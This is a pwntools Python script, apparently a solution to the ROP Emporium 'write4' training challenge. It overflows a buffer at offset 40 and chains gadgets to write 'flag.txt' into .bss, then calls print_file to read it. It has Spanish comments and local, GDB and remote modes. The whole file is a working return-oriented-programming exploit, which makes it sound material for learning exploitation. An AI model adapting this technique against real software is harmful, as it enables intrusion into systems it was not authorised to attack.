#!/usr/bin/env python3

from pwn import *

exe = ELF("./write4")
libc = ELF("./libwrite4.so")
context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']
gdb_script = """
b main
b *0x0000000000400691
b *0x0000000000400629
continue
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    offset = 40

    write_addr = 0x601038
    # [d3bo@archlinux write4]$ readelf -S write4 | grep .bss
    #   [24] .bss              NOBITS           0000000000601038  00001038
    mov_qword_rdi_edi = 0x0000000000400629 # 0x0000000000400629 : mov dword ptr [rsi], edi ; ret
    pop_rdi = 0x0000000000400693 # 0x0000000000400693 : pop rdi ; ret
    pop_rsi_pop_r15 = 0x0000000000400691 # 0x0000000000400691 : pop rsi ; pop r15 ; ret
    part1 = u32(b"flag")
    part2 = u32(b".txt")
    print_file = 0x400510 # Esta función hace un prontf del contenido del archivo que se le pasa como argumento.

    payload = flat({offset: [
            pop_rsi_pop_r15, write_addr+4, 0x00,
            pop_rdi, part2,
            mov_qword_rdi_edi,
            pop_rsi_pop_r15, write_addr, 0x00,
            pop_rdi, part1,
            mov_qword_rdi_edi,
            pop_rsi_pop_r15, 0x00, 0x00,
            pop_rdi, write_addr,
            print_file
        ]})

    print(len(payload))

    r.sendline(payload)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

